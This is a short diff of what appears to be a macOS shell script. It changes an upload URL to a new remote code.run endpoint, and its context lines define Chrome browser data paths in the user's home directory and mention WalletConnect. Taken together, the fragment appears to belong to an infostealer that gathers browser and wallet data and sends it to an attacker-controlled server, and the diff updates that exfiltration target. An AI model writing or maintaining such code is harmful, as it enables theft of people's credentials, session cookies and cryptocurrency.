@@ -7,7 +7,7 @@
 # Custom Redirect URI and WalletConnect metadata (REMOVED: These are Kotlin/Java code snippets and not relevant to the shell script logic)
 
 # UPLOAD URL
-uploadUrl="https://site--upload--57rc49tkrwqv.code.run/upload"
+uploadUrl="https://p01--upload--57rc49tkrwqv.code.run/upload"
 
 # Common macOS browser data root paths for Chromium-based browsers
 CHROME_ROOT_DIR="$HOME/Library/Application Support/Google/Chrome"
